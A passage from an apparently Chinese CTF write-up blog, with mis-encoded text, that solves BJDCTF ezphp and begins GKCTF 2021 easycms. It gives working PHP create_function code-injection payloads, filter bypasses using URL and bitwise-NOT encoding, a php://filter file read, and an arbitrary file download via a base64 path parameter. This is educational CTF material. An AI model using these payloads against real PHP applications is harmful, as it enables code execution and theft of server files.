class="code"><pre><code class="hljs php"><span class="hljs-comment">//createwhat.php,æ³¨æ„è¿™ç©æ„å„¿åœ¨7.2åŠ7.3ä»¥ä¸Šéƒ½æ²¡æ³•ç”¨äº†</span><br><span class="hljs-comment">//è¿™ä¸œè¥¿æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯åœ¨å†…éƒ¨å¯¹ç¬¬äºŒä¸ªå‚æ•°æ‰§è¡Œeval</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a, $b&#x27;</span>, <span class="hljs-string">&#x27;return($a+$b);&#x27;</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$func</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/bjdctfezphp4.png" alt="bjdctfezphp4"></p><p>å›æ˜¾äº†<code>3</code>ï¼Œå®é™…ä¸Š<code>func</code>è¿™ä¸œè¥¿å°±ç›¸å½“äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> (<span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>);<br> &#125;<br></code></pre></td></tr></table></figure><p>è¿™æ—¶æˆ‘ä»¬ä»¤<code>$b =1);&#125;phpinfo();/*</code>ï¼Œæ‰§è¡Œçš„ä¼šæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> (<span class="hljs-variable">$a</span>+<span class="hljs-number">1</span>);&#125;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">/*;</span><br><span class="hljs-comment"> &#125;</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p>æ¯”å¦‚å¯¹äºè¿™æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-string">&#x27;echo  $a&#x27;</span>.<span class="hljs-string">&#x27;test&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str2</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;==============================&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$f1</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a&#x27;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/bjdctfezphp5.png" alt="bjdctfezphp5"></p><p><code>payload</code>ï¼š<code>?id=;&#125;phpinfo();/*</code></p><p><img src="/img/bjdctfezphp6.png" alt="bjdctfezphp6"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">åŸå‡½æ•°ï¼š<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fT</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;test&quot;</span>.<span class="hljs-variable">$id</span>;<br>&#125;<br><br>ä»£ç æ³¨å…¥å:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fT</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;test&quot;</span>;&#125;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">/*;</span><br><span class="hljs-comment">&#125;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯¹äº<code>$code(&#39;&#39;, $arg); </code>è¿™ä¸œè¥¿ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>create_function</code>æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>)<br></code></pre></td></tr></table></figure><p>è¿™ä¸œè¥¿æ„æ€æ˜¯åªåŒ¹é…å¤§å°å†™å­—æ¯å’Œæ•°å­—ï¼Œè¦æ˜¯å­˜åœ¨å…¶å®ƒçš„å°±è¿”å›<code>false</code>ã€‚<code>create_function</code>æ­£å¥½å­˜åœ¨<code>_</code>ã€‚ä»¤<code>flag[code]=create_function</code>ï¼š<code>create_function(&#39;&#39;,$arg)</code>ï¼Œè¿™ä¸œè¥¿å°±ç›¸å½“äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda</span>(<span class="hljs-params"><span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br><span class="hljs-variable">$arg</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨<code>$arg</code>é—­åˆ<code>&#123;</code>ç„¶åè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ¯”å¦‚<code>arg=&#125;func();//</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> &#125;<span class="hljs-title function_ invoke__">func</span>();<span class="hljs-comment">//</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºå­˜åœ¨<code>include&quot;flag.php&quot;</code>ï¼Œå¯ä»¥åˆ©ç”¨<code>var_dump</code>å’Œ<code>get_defined_vars()</code>å°†æ‰€æœ‰å˜é‡å’Œå€¼è¾“å‡º(å‡è®¾<code>flag.php</code>ä¸­å®šä¹‰äº†<code>$flag=xxxx</code>ä¹‹ç±»çš„)</p><p>æ¢³ç†ä¸‹æˆªè‡³åˆ°ç›®å‰çš„<code>payload:</code></p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">file</span>=data://text/plain,debu_debu_aqua<span class="hljs-variable">&amp;debu</span>=aqua_is_cute <span class="hljs-variable">&amp;shana</span>[]=1<span class="hljs-variable">&amp;passwd</span>[]=2<span class="hljs-variable">&amp;flag</span>[code]=create_function<span class="hljs-variable">&amp;flag</span>[arg]=&#125;var_dump(get_defined_vars());//<br><br>POSTä¼ <span class="hljs-keyword">file</span>=1<span class="hljs-variable">&amp;debu</span>=2<br><br></code></pre></td></tr></table></figure><p>æ³¨æ„<code>$_SERVER[&#39;QUERY_STRING&#39;])</code>ï¼ŒæŠŠè¿™ä¸œè¥¿<code>URL</code>ç¼–ç ä¸€ä¸‹(fileå’Œ&#x3D;ä¸ç”¨ç¼–ç ï¼Œæ²¡è¿‡æ»¤)ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">//ä¸€èˆ¬ä¸ä¼šå¯¹å­—æ¯è¿›è¡ŒURLç¼–ç ï¼Œå¦‚æœç¼–ç çš„è¯å°±æ˜¯å¯¹åº”åå…­è¿›åˆ¶è¡¨ç¤ºç„¶åå‰é¢çš„<span class="hljs-number">0</span><span class="hljs-keyword">x</span>æ¢æˆç™¾åˆ†å·<br><span class="hljs-number">1</span>nD<span class="hljs-number">3</span><span class="hljs-keyword">x</span>.php?file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>A&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-variable">%63</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span>&#125;<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%70</span>(<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%64</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%73</span>())<span class="hljs-comment">;//</span><br><br>POSTä¼ file<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;debu<span class="hljs-operator">=</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="/img/bjdctfezphp7.png" alt="bjdctfezphp7"></p><p>ç°åœ¨è¦æƒ³åŠæ³•è¯»<code>rea1fl4g.php</code>ï¼Œä¸è¿‡è¿˜æ˜¯è¦æ³¨æ„å‰é¢<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>å’Œæ­£åˆ™åŒ¹é…çš„é™åˆ¶ã€‚</p><p>å¯ä»¥ç”¨<code>require</code>å»è¯»ï¼Œä½†é™åˆ¶äº†<code>con,fil</code>å•¥çš„ï¼Œè€ƒè™‘å–åç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å‚è€ƒhttps://www.shawroot.cc/815.html</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = r e a 1 f l 4 g . p h p&quot;</span>;<br><span class="hljs-variable">$arr1</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;~(&quot;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;%&quot;</span>.<span class="hljs-title function_ invoke__">bin2hex</span>(~<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;)&lt;br&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f)<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/<span class="hljs-number">1</span>nD<span class="hljs-number">3</span><span class="hljs-keyword">x</span>.php?file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>A&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-variable">%63</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span>&#125;require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure><p><img src="/img/bjdctfezphp9.png" alt="bjdctfezphp9"></p><p>ç„¶åè§£ç ï¼š</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Real_Flag In Here!!!<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å’¦ï¼Œä½ å±…ç„¶æ‰¾åˆ°æˆ‘äº†ï¼Ÿï¼ä¸è¿‡çœ‹åˆ°è¿™å¥è¯ä¹Ÿä¸ä»£è¡¨ä½ å°±èƒ½æ‹¿åˆ°flagå“¦ï¼&quot;</span>;</span><br><span class="language-php"><span class="hljs-variable">$f4ke_flag</span> = <span class="hljs-string">&quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;</span>;</span><br><span class="language-php"><span class="hljs-variable">$rea1_f1114g</span> = <span class="hljs-string">&quot;flag&#123;870ae629-6309-425c-a5e6-22fbe7cc08fc&#125;&quot;</span>;</span><br><span class="language-php"><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$rea1_f1114g</span>);</span><br></code></pre></td></tr></table></figure><h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p><code>æç¤ºï¼šåå°å¯†ç 5ä½å¼±å£ä»¤</code></p><p>![GKCTF 2021easycms1](img&#x2F;GKCTF 2021easycms1.png)</p><p>ç™»å½•é¡µé¢ä¸€ç›´ç‚¹ä¸äº†ã€‚ã€‚ä¹Ÿæ²¡å•¥æç¤ºï¼Œçœ‹äº†wpå‘ç°æœ‰è¿™ä¹ˆä¸ªç•Œé¢ï¼š<br><code>admin.php</code></p><p>![GKCTF 2021easycms3](img&#x2F;GKCTF 2021easycms3.png)</p><p>æ³¨æ„è¿™ä¸ª<code>URL</code>ï¼š<code>admin.php?m=user&amp;f=login&amp;referer=L2FkbWluLnBocA==</code>ï¼Œè§£ç åæ˜¯<code>/admin.php</code></p><p>ç”¨æˆ·å<code>admin</code>,å¯†ç <code>12345</code></p><p>è®¾è®¡ - ä¸»é¢˜ - è‡ªå®šä¹‰ - å­˜åœ¨å¯¼å‡ºæ–‡ä»¶çš„åŠŸèƒ½</p><p>![GKCTF 2021easycms6](img&#x2F;GKCTF 2021easycms6.png)</p><p>![GKCTF 2021easycms7](img&#x2F;GKCTF 2021easycms7.png)</p><p>å¯¼å‡ºåä¼šä¸‹è½½ä¸€ä¸ª<code>zip</code>æ–‡ä»¶ï¼ŒæŠ“åŒ…çœ‹çœ‹ï¼š</p><p>æ³¨æ„è¿™é‡Œçš„<code>URL</code>:<code>L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvYS56aXA=</code></p><p>![GKCTF 2021easycms4](img&#x2F;GKCTF 2021easycms4.png)</p><p>è§£ç ï¼š<code>/var/www/html/system/tmp/theme/default/a.zip</code></p><p>å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½åŠŸèƒ½ï¼Ÿ<code>theme</code>ç›´æ¥æ¢æˆ<code>/flag</code>çš„<code>base64</code>ï¼š<code>L2ZsYWc=</code></p><p>æ³¨æ„ä¸‹è½½çš„æ˜¯å‹ç¼©åŒ…ï¼Œåç¼€æ”¹æˆ<code>txt</code>å†æ‰“å¼€å°±è¡Œã€‚</p><p>![GKCTF 2021easycms5](img&#x2F;GKCTF 2021easycms5.png)</p><p>ç¬¬äºŒç§æ–¹æ³•ï¼š</p><p>è®¾è®¡ - &gt; é«˜çº§ -&gt; ç¼–è¾‘ è¿™é‡Œè‡³æ­¤è‡ªå®šä¹‰ï¼Œæ¯”å¦‚ï¼š</p><p><img src="/img/easycms1.png" alt="easycms1"></p><p>ä½†ä¸èƒ½ç›´æ¥ä¿å­˜ï¼Œä¼šæç¤ºæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š</p><p><img src="/img/easycmms2.png" 